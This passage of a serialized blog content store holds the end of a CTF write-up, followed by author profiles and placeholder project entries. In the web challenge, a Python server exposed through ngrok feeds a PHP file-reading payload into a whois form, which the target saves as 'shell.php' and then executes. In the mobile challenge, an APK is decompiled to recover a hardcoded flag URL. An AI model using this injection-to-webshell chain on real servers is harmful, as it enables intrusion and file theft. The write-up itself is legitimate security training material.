flag\nphp_payload = '\u003C?php echo file_get_contents(\"/flag.txt\"); ?>'\n\n# Start the server\nwith socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:\n    s.bind((HOST, PORT))\n    s.listen()\n    print(f\"Listening on {PORT}...\")\n    while True:\n        conn, addr = s.accept()\n        with conn:\n            # Send the PHP payload immediately\n            conn.sendall(php_payload.encode())\n            print(\"Payload sent to:\", addr)\n```\n4. I used ngrok to expose my local server to the internet:\n```bash\nngrok tcp 1234\n```\n5. I submitted the form with these values:\n```plaintext\nhost\n0.tcp.ap.ngrok.io\n\nport\n10965 *ngrok forwarding port will be given by ngrok\n\nquery\ntesting *this will be the query object anything will do\n\nfilename\nshell.php \n```\n6. This caused the server to execute the whois command and connect to my Python server:\n![](./assets/web/domain%20info/Screenshot%202025-05-04%20131911.png)\n![](./assets/web/domain%20info/Screenshot%202025-05-04%20131938.png)\n\n7. This payload was saved as a PHP file in the uploads directory, which I could then access to execute the code and view the flag by just pressing Click here to view your file.\n![](./assets/web/domain%20info/lastby.png)\n\n### Final Result\n---\n![](./assets/web/domain%20info/Screenshot%202025-05-04%20132143.png)\n**Flag:** `UVT{M4l1c10us_Wh0_1s_C0mmand_4nd_upl0ad}`\n\n## [Mobile-Android]\n![](./assets/mobile/task.png)\n\n### Goals\n---\n1. Understand how the Android application works\n2. Find the flag in the Android application\n3. Understand how the Android application is vulnerable to reverse engineering\n\n### Solution [Unintended]\n---\n1. First, I install the apk into the emulator i have and open it.\n![](./assets/mobile/open.png)\n2. I can see that the app is a simple app where It shows jokes and some info from UVT INFO.\n3. Next I decompile it with apktool and open the decompiled file ```libnative-lib.so``` with ghidra.\n4. I analyze the disassembled code to look for vulnerabilities or hardcoded values.\n5. In the function gethiddenflag() we can see a simple code inside\n```undefined8 Java_com_example_uvt_1ctf_12025_Utils_getHiddenFlag(long *param_1)\n\n{\n  void *__ptr;\n  undefined8 uVar1;\n  \n  __ptr = (void *)FUN_00100c70(\"91.99.1.179\",0xa4fa,\"/somebody-found-a-random-flag-path\");\n  uVar1 = (**(code **)(*param_1 + 0x538))(param_1,__ptr);\n  free(__ptr);\n  return uVar1;\n}\n```\n6. We can see that the function is calling a function with the address 0x538 and passing the ip address and the path to it.\n7. But indeed we direct open the website (0xa4fa hex is 42234 in unicode) so directly open the website and we can see the flag inside the website.\n\n### Final Result\n---\n![](./assets/mobile/flag.png)\n**Flag:** `UVT{m0b1l3_.s0_m4y_c0nt4in_s3ns1tiv3_1nf0}`","src/content/blog/uvtctf2025/index.mdx",[73],"./assets/1200x630.png","bdf53caf5af9be89","authors",["Map",24,77,22,94,23,109,21,124],{"id":24,"data":78,"filePath":84,"digest":85,"rendered":86},{"name":24,"pronouns":79,"avatar":80,"bio":81,"website":82,"github":83},"he/him","https://bakayang.vercel.app/images/kirby.png","You have one shot, one opportunity.","https://bakayang.vercel.app/","https://github.com/Exberg","src/content/authors/bakayang.md","316c37d657e970cf",{"html":87,"metadata":88},"",{"headings":89,"localImagePaths":90,"remoteImagePaths":91,"frontmatter":92,"imagePaths":93},[],[],[],{"name":24,"pronouns":79,"avatar":80,"bio":81,"website":82,"github":83},[],{"id":22,"data":95,"filePath":100,"digest":101,"rendered":102},{"name":22,"pronouns":79,"avatar":96,"bio":97,"website":98,"github":99},"https://avatars.githubusercontent.com/u/83480366?v=4","No logs, No traces...","https://gr1d-init.github.io/","https://github.com/gr1d-init","src/content/authors/gr1d.md","44acb4cd6d5506f8",{"html":87,"metadata":103},{"headings":104,"localImagePaths":105,"remoteImagePaths":106,"frontmatter":107,"imagePaths":108},[],[],[],{"name":22,"pronouns":79,"avatar":96,"bio":97,"website":98,"github":99},[],{"id":23,"data":110,"filePath":115,"digest":116,"rendered":117},{"name":23,"pronouns":79,"avatar":111,"bio":112,"website":113,"github":114},"https://avatars.githubusercontent.com/u/130538576?v=4","HTTP 200 : Exploitation Success","https://weixuan0110.github.io/","https://github.com/weixuan0110","src/content/authors/w_11.md","e15764d23f5d0817",{"html":87,"metadata":118},{"headings":119,"localImagePaths":120,"remoteImagePaths":121,"frontmatter":122,"imagePaths":123},[],[],[],{"name":23,"pronouns":79,"avatar":111,"bio":112,"website":113,"github":114},[],{"id":21,"data":125,"filePath":128,"digest":129,"rendered":130},{"name":21,"pronouns":79,"avatar":126,"github":127},"https://avatars.githubusercontent.com/u/89591638?v=4","https://github.com/HoeZhiWan","src/content/authors/hoezhiwan.md","c40ee5bf3f8b63ab",{"html":87,"metadata":131},{"headings":132,"localImagePaths":133,"remoteImagePaths":134,"frontmatter":135,"imagePaths":136},[],[],[],{"name":21,"pronouns":79,"avatar":126,"github":127},[],"projects",["Map",139,140,167,168,186,187],"project-b",{"id":139,"data":141,"filePath":153,"assetImports":154,"digest":156,"rendered":157},{"name":142,"description":143,"tags":144,"image":149,"link":150,"startDate":151,"endDate":152},"Project B","This is an example project description! You should replace this with a description of your own project.",[145,146,147,148],"Framework A","Library B","Tool C","Resource D","__ASTRO_IMAGE_../../../public/static/1200x630.png","https://example.com",["Date","2024-02-01T00:00:00.000Z"],["Date","2024-03-01T00:00:00.000Z"],"src/content/projects/project-b.md",[155],"../../../public/static/1200x630.png","d786c69cb8a53e6d",{"html":87,"metadata":158},{"headings":159,"localImagePaths":160,"remoteImagePaths":161,"frontmatter":162,"imagePaths":166},[],[],[],{"name":142,"description":143,"tags":163,"image":155,"link":150,"startDate":164,"endDate":165},[145,146,147,148],"2024-02-01","2024-03-01",[],"project-a",{"id":167,"data":169,"filePath":174,"assetImports":175,"digest":176,"rendered":177},{"name":170,"description":143,"tags":171,"image":149,"link":150,"startDate":172,"endDate":173},"Project A",[145,146,147,148],["Date","2024-01-01T00:00:00.000Z"],["Date","2024-02-01T00:00:00.000Z"],"src/content/projects/project-a.md",[155],"3d4f4ac7baea4714",{"html":87,"metadata":178},{"headings":179,"localImagePaths":180,"remoteImagePaths":181,"frontmatter":182,"imagePaths":185},[],[],[],{"name":170,"description":143,"tags":183,"image":155,"link":150,"startDate":184,"endDate":164},[145,146,147,148],"2024-01-01",[],"project-c",{"id":186,"data":188,"filePath":192,"assetImports":193,"digest":194,"rendered":195},{"name":189,"description":143,"tags":190,"image":149,"link":150,"startDate":191},"Project C",[145,146,147,148],["Date","2024-03-01T00:00:00.000Z"],"src/content/projects/project-c.md",[155],"1fbd50259edaa4f9",{"html":87,"metadata":196},{"headings":197,"localImagePaths":198,"remoteImagePaths":199,"frontmatter":200,"imagePaths":202},[],[],[],{"name":189,"description":143,"tags":201,"image":155,"link":150,"startDate":165},[145,146,147,148],[]]